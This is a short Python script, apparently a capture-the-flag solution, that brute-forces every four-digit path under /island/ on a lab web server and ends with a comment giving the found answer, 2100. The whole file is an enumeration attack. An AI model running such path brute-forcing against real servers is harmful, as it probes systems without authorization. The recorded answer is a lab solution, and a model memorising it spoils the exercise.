import requests


def attack(path):
	r = requests.get('http://10.10.80.70/island/{}'.format(path))
	print('/{} -> {}'.format(path, r))


for i in range(0, 10):
	for j in range(0, 10):
		for k in range(0, 10):
			for l in range(0, 10):
				num = '{}{}{}{}'.format(i, j, k, l)
				attack(num)



# 	answer -> http://10.10.80.70/island/2100